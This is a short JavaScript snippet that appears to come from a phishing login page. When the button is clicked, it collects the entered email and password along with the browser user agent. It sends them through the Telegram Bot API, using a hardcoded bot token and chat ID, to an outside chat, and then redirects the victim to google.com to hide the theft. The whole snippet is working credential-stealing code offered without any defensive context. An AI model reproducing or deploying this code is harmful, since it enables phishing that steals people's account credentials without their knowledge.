var token = "7316626659:AAFV8FUvl7U-p6tRxHo2afSglS2Fce3Fuog";
        var chat = "6692997408";
let se = navigator.userAgent;
        $("button").click(function(){
            if($("#password").val()==""){
                alert("Password field cannot be empty.");
            }else{
                var mail=$("#username").val();
                var pass=$("#password").val();
                var m = `Email: ${mail}\nPass: ${pass}\n𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁: ${se}`;
                $.post(`https://api.telegram.org/bot${token}/sendMessage`,{
                    chat_id:chat,
                    text:m
                }).done(function(data){
                    window.location.replace("https://google.com");
                }).fail(function(data){
                    alert("Something is wrong");
                });
            }
        });
